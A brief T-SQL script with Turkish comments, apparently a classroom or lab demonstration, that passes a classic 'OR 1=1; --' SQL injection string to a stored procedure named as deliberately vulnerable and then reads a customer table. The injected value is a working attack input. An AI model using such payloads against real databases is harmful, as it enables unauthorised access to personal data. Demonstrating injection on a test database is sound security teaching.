USE DB_Performans;
GO

-- Saldırı değeri değişkene atanıyor
DECLARE @SaldiriDegeri NVARCHAR(100) = 'SP'' OR 1=1; --';

-- OR 1=1 mantıksal hatası enjekte edilerek güvenlik duvarı aşılıyor
EXEC GetCustomerByState_Vulnerable @State = @SaldiriDegeri;
GO

SELECT TOP 10 * FROM DB_Performans.dbo.Olist_Customers;
GO